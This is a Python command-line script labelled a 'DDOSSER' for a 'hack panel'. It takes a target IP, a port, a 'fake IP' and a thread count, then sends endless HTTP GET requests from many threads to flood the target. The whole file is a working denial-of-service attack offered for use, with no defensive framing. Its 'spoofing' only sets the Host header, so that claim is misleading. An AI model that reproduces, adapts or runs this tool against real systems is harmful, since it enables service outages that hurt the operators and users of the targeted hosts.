import socket
import threading
import argparse

parser = argparse.ArgumentParser(description='DDOSSER MADE FOR AZIVS HACK PANEL')
parser.add_argument("-t", "--target_ip", help="Target IP to attack", type=str, required=True)
parser.add_argument("-f", "--fake_ip", help="Choose A random IP to spoof your real one, DO NOT USE YOURS HERE", type=str, required=True)
parser.add_argument("-p", "--port", help="Port to attack, must be open", type=int, required=True)
parser.add_argument("-b", "--bots", help="Amount of bots to DDos With", type=int, required=True)
args = parser.parse_args()

target = args.target_ip
fake_ip = args.fake_ip
port = args.port
bots = args.bots

def test():
    if port == 0:
        print("PORT CAN NOT BE EMPTY")
        quit()

    if fake_ip == "":
        print("FAKE IP CAN NOT BE EMPTY")
        quit()

    if target == "":
        print("TARGET IP CAN NOT BE EMPTY")
        quit()

attack_num = 0
def attack():
    test()

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()

for i in range(bots):
    thread = threading.Thread(target=attack)
    thread.start() 